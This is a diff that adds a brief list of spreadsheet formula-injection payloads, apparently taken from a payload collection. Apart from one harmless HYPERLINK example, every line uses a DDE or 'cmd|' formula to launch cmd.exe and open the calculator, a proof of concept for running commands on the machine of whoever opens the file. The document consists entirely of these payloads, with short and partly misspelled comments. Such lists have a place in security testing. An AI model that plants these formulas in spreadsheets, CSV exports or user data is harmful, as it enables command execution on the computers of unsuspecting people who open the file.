@@ -1,0 +1,5 @@
+=HYPERLINK("https://google.com", "google.com")          --> Redirects to google.com
+=DDE("cmd";"/C calc";"!A0")A0                           --> Brigns out calculator
+@SUM(1+9)*cmd|' /C calc'!A0
+=10+20+cmd|' /C calc'!A0
+
